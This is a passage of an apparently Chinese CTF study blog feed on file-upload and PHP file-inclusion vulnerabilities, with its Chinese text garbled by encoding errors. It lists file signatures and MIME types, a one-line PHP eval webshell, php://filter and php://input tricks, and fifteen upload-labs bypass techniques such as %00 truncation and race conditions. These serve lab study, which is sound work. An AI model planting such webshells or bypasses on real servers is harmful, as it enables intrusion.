class="line">Adobe Acrobat (pdf)ï¼Œ        æ–‡ä»¶å¤´ï¼š255044462D312E</span><br><span class="line">Quicken (qdf)ï¼Œ             æ–‡ä»¶å¤´ï¼šAC9EBD8F</span><br><span class="line">Windows Password (pwl)ï¼Œ     æ–‡ä»¶å¤´ï¼šE3828596</span><br><span class="line">RAR Archive (rar)ï¼Œ           æ–‡ä»¶å¤´ï¼š52617221</span><br><span class="line">Wave (wav)ï¼Œ               æ–‡ä»¶å¤´ï¼š57415645</span><br><span class="line">AVI (avi)ï¼Œ                 æ–‡ä»¶å¤´ï¼š41564920</span><br><span class="line">Real Audio (ram)ï¼Œ           æ–‡ä»¶å¤´ï¼š2E7261FD</span><br><span class="line">Real Media (rm)ï¼Œ            æ–‡ä»¶å¤´ï¼š2E524D46</span><br><span class="line">MPEG (mpg)ï¼Œ              æ–‡ä»¶å¤´ï¼š000001BA</span><br><span class="line">MPEG (mpg)ï¼Œ              æ–‡ä»¶å¤´ï¼š000001B3</span><br><span class="line">Quicktime (mov)ï¼Œ           æ–‡ä»¶å¤´ï¼š6D6F6F76</span><br><span class="line">Windows Media (asf)ï¼Œ        æ–‡ä»¶å¤´ï¼š3026B2758E66CF11</span><br><span class="line">MIDI (mid)ï¼Œ                æ–‡ä»¶å¤´ï¼š4D546864</span><br></pre></td></tr></table></figure><h3 id="éƒ¨åˆ†MIMEè¡¨"><a href="#éƒ¨åˆ†MIMEè¡¨" class="headerlink" title="éƒ¨åˆ†MIMEè¡¨"></a>éƒ¨åˆ†MIMEè¡¨</h3><table><thead><tr><th><code>.aac</code></th><th align="center">AAC audio</th><th><code>audio/aac</code></th></tr></thead><tbody><tr><td><code>.abw</code></td><td align="center"><a href="https://en.wikipedia.org/wiki/AbiWord" target="_blank" rel="noopener">AbiWord</a> document</td><td><code>application/x-abiword</code></td></tr><tr><td><code>.arc</code></td><td align="center">Archive document (multiple files embedded)</td><td><code>application/x-freearc</code></td></tr><tr><td><code>.avi</code></td><td align="center">AVI: Audio Video Interleave</td><td><code>video/x-msvideo</code></td></tr><tr><td><code>.azw</code></td><td align="center">Amazon Kindle eBook format</td><td><code>application/vnd.amazon.ebook</code></td></tr><tr><td><code>.bin</code></td><td align="center">Any kind of binary data</td><td><code>application/octet-stream</code></td></tr><tr><td><code>.bmp</code></td><td align="center">Windows OS/2 Bitmap Graphics</td><td><code>image/bmp</code></td></tr><tr><td><code>.bz</code></td><td align="center">BZip archive</td><td><code>application/x-bzip</code></td></tr><tr><td><code>.bz2</code></td><td align="center">BZip2 archive</td><td><code>application/x-bzip2</code></td></tr><tr><td><code>.csh</code></td><td align="center">C-Shell script</td><td><code>application/x-csh</code></td></tr><tr><td><code>.css</code></td><td align="center">Cascading Style Sheets (CSS)</td><td><code>text/css</code></td></tr><tr><td><code>.csv</code></td><td align="center">Comma-separated values (CSV)</td><td><code>text/csv</code></td></tr><tr><td><code>.doc</code></td><td align="center">Microsoft Word</td><td><code>application/msword</code></td></tr><tr><td><code>.docx</code></td><td align="center">Microsoft Word (OpenXML)</td><td><code>application/vnd.openxmlformats-officedocument.wordprocessingml.document</code></td></tr><tr><td><code>.gif</code></td><td align="center">Graphics Interchange Format (GIF)</td><td><code>image/gif</code></td></tr><tr><td><code>.htm.html</code></td><td align="center">HyperText Markup Language (HTML)</td><td><code>text/html</code></td></tr><tr><td><code>.jpeg</code> <code>.jpg</code></td><td align="center">JPEG images</td><td><code>image/jpeg</code></td></tr><tr><td><code>.js</code></td><td align="center">JavaScript</td><td><code>text/javascript</code></td></tr><tr><td><code>.json</code></td><td align="center">JSON format</td><td><code>application/json</code></td></tr><tr><td><code>.mp3</code></td><td align="center">MP3 audio</td><td><code>audio/mpeg</code></td></tr><tr><td><code>.png</code></td><td align="center">Portable Network Graphics</td><td><code>image/png</code></td></tr><tr><td><code>.pdf</code></td><td align="center">Adobe <a href="https://acrobat.adobe.com/us/en/why-adobe/about-adobe-pdf.html" target="_blank" rel="noopener">Portable Document Format</a> (PDF)</td><td><code>application/pdf</code></td></tr><tr><td><code>.ppt</code></td><td align="center">Microsoft PowerPoint</td><td><code>application/vnd.ms-powerpoint</code></td></tr><tr><td><code>.sh</code></td><td align="center">Bourne shell script</td><td><code>application/x-sh</code></td></tr><tr><td><code>.svg</code></td><td align="center">Scalable Vector Graphics (SVG)</td><td><code>image/svg+xml</code></td></tr><tr><td><code>tif.tiff</code></td><td align="center">Tagged Image File Format (TIFF)</td><td><code>image/tiff</code></td></tr><tr><td><code>.txt</code></td><td align="center">Text, (generally ASCII or ISO 8859-<em>n</em>)</td><td><code>text/plain</code></td></tr><tr><td><code>.xml</code></td><td align="center"><code>XML</code></td><td><code>application/xml</code> ä»£ç å¯¹æ™®é€šç”¨æˆ·æ¥è¯´ä¸å¯è¯» (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3) <code>text/xml</code> ä»£ç å¯¹æ™®é€šç”¨æˆ·æ¥è¯´å¯è¯» (<a href="https://tools.ietf.org/html/rfc3023#section-3" target="_blank" rel="noopener">RFC 3023</a>, section 3)</td></tr></tbody></table><h4 id="åè®°ï¼šç™¾åº¦æ¯upload"><a href="#åè®°ï¼šç™¾åº¦æ¯upload" class="headerlink" title="åè®°ï¼šç™¾åº¦æ¯upload"></a>åè®°ï¼šç™¾åº¦æ¯upload</h4><p>ä¸ºä½•å¯ä»¥ç›´æ¥ä¸Šä¼ åç¼€ä¸º pht æˆ– phtml ç»•è¿‡é»‘åå•å‘¢ï¼Ÿ</p><p>phpçš„confæ–‡ä»¶ä¸­æ˜¯æœ‰ä¸€ä¸ªæ­£åˆ™çš„åç¼€åé™åˆ¶çš„ï¼Œåªè¦ç¬¦åˆéƒ½å¯ä»¥è¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œã€‚</p><p>ç¬¦åˆçš„åç¼€åŒ…æ‹¬ phpã€php3ã€php4ã€php5ã€phtmlã€pht ç­‰ã€‚</p><p>ä»€ä¹ˆç¯å¢ƒä¸‹å¯ä»¥è§£æ phtml å’Œ pht å‘¢ï¼Ÿ</p><p>1ï¼Œphpstudyå’Œwampä»¥åŠcentosç”¨yumæ–¹å¼ å®‰è£…çš„lampç¯å¢ƒä¸èƒ½è§£æphtmlå’Œpht</p><p>2ï¼Œubuntuå’Œdebianåˆ©ç”¨apt-getæ–¹å¼å®‰è£…çš„lampç¯å¢ƒ å°±èƒ½è§£æphtmlå’Œpht</p><p>åˆ©ç”¨è¿™äº›ç¯å¢ƒç‰¹æ€§å’Œé»‘åå•å°±èƒ½ç»•è¿‡é™åˆ¶ï¼Œè¾¾åˆ°ä¸Šä¼ webshellçš„ç›®çš„ã€‚</p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><h4 id="phpæ–‡ä»¶åŒ…å«çš„å½¢å¼"><a href="#phpæ–‡ä»¶åŒ…å«çš„å½¢å¼" class="headerlink" title="phpæ–‡ä»¶åŒ…å«çš„å½¢å¼"></a>phpæ–‡ä»¶åŒ…å«çš„å½¢å¼</h4><p>&lt;?php<br>    $file = $_GET[â€˜fileâ€™];<br>    if(isset($file)){<br>    include(â€œ$fileâ€);<br>    //require();<br>    //require_once();<br>    //include_once();<br>    }else{<br>        echo â€œfile failâ€<br>    }</p><h4 id="phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«å°±æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š"><a href="#phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«å°±æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š" class="headerlink" title="phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«å°±æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š"></a>phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«å°±æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š</h4><p>include()<br>include_once()<br>require()<br>require_once()<br>æ³¨ï¼šrequire()å¦‚æœåœ¨åŒ…å«è¿‡ç¨‹ä¸­å‡ºé”™ï¼Œæ¯”å¦‚æ–‡ä»¶ä¸å­˜åœ¨ç­‰ï¼Œä¼šç›´æ¥é€€å‡ºä¸æ‰§è¡Œåç»­è¯­å¥.<br>include()å¦‚æœå‡ºé”™ä¼šæå‡ºè­¦å‘Šï¼Œåç»­è¯­å¥ä¼šç»§ç»­æ‰§è¡Œ<br>æ–‡ä»¶åŒ…å«æ¼æ´çš„åœºæ™¯:<br>1.å…·æœ‰ç›¸å…³çš„æ–‡ä»¶åŒ…å«å‡½æ•°<br>2.æ–‡ä»¶åŒ…å«å‡½æ•°ä¸­å­˜åœ¨åŠ¨æ€å˜é‡ï¼Œæ¯”å¦‚include $file;.<br>3.æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è¯¥å˜é‡,æ¯”å¦‚$file = $_GET[â€˜fileâ€™];.</p><h4 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»:"></a>åˆ†ç±»:</h4><p>1.LFI(Local File Inclusion)<br>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒæŒ‡èƒ½æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹é‡åˆ°çš„éƒ½æ˜¯æœ¬åœ°åŒ…å«ã€‚<br>2.RFI(Remote File Inclusion)<br>è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œåªèƒ½å¤ŸåŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶æ‰§è¡Œï¼Œç”±äºè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´æ˜¯æˆ‘ä»¬å¯æ§çš„<br>ï¼Œå› æ­¤æ¼æ´ä¸€æ—¦å­˜åœ¨å±å®³å°±å¾ˆå¤§åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œéœ€è¦PHP.INIä¸­è¿›è¡Œé…ç½®<br>1.allow_url_fopen = On<br>2.allow_url_include = On</p><h3 id="åšé¢˜è¿‡ç¨‹é‡åˆ°çš„è¡¥å……"><a href="#åšé¢˜è¿‡ç¨‹é‡åˆ°çš„è¡¥å……" class="headerlink" title="åšé¢˜è¿‡ç¨‹é‡åˆ°çš„è¡¥å……:"></a>åšé¢˜è¿‡ç¨‹é‡åˆ°çš„è¡¥å……:</h3><p>å¯ä»¥çˆ†å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="actionscript">system(<span class="string">"ls"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>allow_url_includeä¸ºOnï¼Œç”¨<a href="php://input">php://input</a>ä¼ªåè®®è¿›è¡ŒåŒ…å«</p><p>php://filter/read=convert.base64-encode/recource=index.php;</p><p>è¿™å¥è¯çš„æ„æ€æ˜¯æˆ‘ä»¬ç”¨base64ç¼–ç çš„æ–¹å¼æ¥è¯»æ–‡ä»¶index.phpï¼›</p><p>è‹¥åå°ä»£ç è¿‡æ»¤äº†&lt;?å’Œphpå…³é”®å­—å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡phpå…³é”®å­—ï¼Œç”¨HTMLç»•è¿‡&lt;?</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"pHp"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'sb'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é‡æ–°æ ¹æ®upload-labs-masteråšçš„æ•´ç†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.å…è®¸.jpg|.png|.gif</span><br><span class="line">ç»•è¿‡æ–¹æ³•ï¼šç¦ç”¨jsï¼Œæˆ–è€…æ·»åŠ |.phpå…è®¸é©¬ä¸Šä¼ ï¼Œæˆ–è€…ä¸Šä¼ jpgæ–‡ä»¶å†æŠ“åŒ…ä¿®æ”¹åç¼€ä¸º.php</span><br><span class="line">2.åªå¯¹content-typeè¿›è¡Œå¤„ç†ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºå›¾ç‰‡çš„æ ¼å¼image&#x2F;jpegã€image&#x2F;pngã€image&#x2F;gif</span><br><span class="line">3.ç”¨é»‘åå•ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€çš„æ–‡ä»¶</span><br><span class="line">ä½†å¯ä»¥ä¸Šä¼ .phtml .phps .php5 .pht</span><br><span class="line">4.é»‘åå•è¿‡æ»¤é™¤äº†.htaccessæ‰€æœ‰çš„åç¼€åï¼Œå…ˆä¸Šä¼ .htaccessï¼Œå†ä¸Šä¼ jpgé©¬</span><br><span class="line">5.å¤§å°å†™æœªè¿‡æ»¤ï¼Œå¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡WAF</span><br><span class="line">6.æœªå¯¹åç¼€åè¿›è¡Œå»ç©ºï¼Œå¯ä»¥åŠ ç©ºæ ¼ç»•è¿‡</span><br><span class="line">7.æœªå¯¹ç‚¹ç»•è¿‡ï¼Œå¯ä»¥ç”¨1.php.æ¥ç»•è¿‡ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„â€.â€</span><br><span class="line">8.æ²¡æœ‰å¯¹åç¼€åä¸­çš„â€™::$DATAâ€™è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥åœ¨åç¼€ååŠ ::$DATAç»•è¿‡æ–‡ä»¶å+&quot;::$DATA&quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å</span><br><span class="line">9.åˆ©ç”¨1.php. .ï¼ˆç‚¹+ç©ºæ ¼+ç‚¹ï¼‰æ¥ç»•è¿‡</span><br><span class="line">10. $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);é»‘åå•è¿‡æ»¤å°†åç¼€åæ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™å¯ä»¥ç»•è¿‡</span><br><span class="line">11.ç™½åå•åˆ¤æ–­$img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;ç›´æ¥æ‹¼æ¥ï¼Œå¯ä»¥ç”¨%00ç»•è¿‡</span><br><span class="line">12.save_pathå‚æ•°é€šè¿‡POSTæ–¹å¼ä¼ é€’ï¼Œè¿˜æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œå› ä¸ºPOSTä¸ä¼šåƒGETå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹</span><br><span class="line">13.getimagesizeå‡½æ•°åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œphp_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œé€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œéƒ½å¯ä»¥ç”¨å›¾ç‰‡é©¬çš„æ–¹å¼ç»•è¿‡</span><br><span class="line">14.äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</span><br><span class="line">15.æ¡ä»¶ç«äº‰ï¼Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶ååˆ¤æ–­æ–‡ä»¶åç¼€æ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œå¦‚æœåœ¨åˆ™é‡å‘½åï¼Œå¦åˆ™åˆ é™¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ 1.phpåªéœ€è¦åœ¨å®ƒåˆ é™¤ä¹‹å‰è®¿é—®å³å¯ï¼Œå¯ä»¥åˆ©ç”¨burpçš„intruderæ¨¡å—ä¸æ–­ä¸Šä¼ ï¼Œç„¶åæˆ‘ä»¬ä¸æ–­çš„è®¿é—®åˆ·æ–°è¯¥åœ°å€å³å¯ï¼Œæœ‰moveå’ŒrenameFileå‡½æ•°çš„å¯ä»¥é€šè¿‡ä¸æ–­ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç”±äºæ¡ä»¶ç«äº‰å¯èƒ½æ¥ä¸åŠé‡å‘½åï¼Œä»è€Œä¸Šä¼ æˆåŠŸã€‚</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;ä¸€å¥è¯æœ¨é©¬&quot;&gt;&lt;a href=&quot;#ä¸€å¥è¯æœ¨é©¬&quot; class=&quot;headerlink&quot; title=&quot;ä¸€å¥è¯æœ¨é©¬&quot;&gt;&lt;/a&gt;ä¸€å¥è¯æœ¨é©¬&lt;/h4&gt;
    
    </summary>
    
    
    
      <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
</feed>
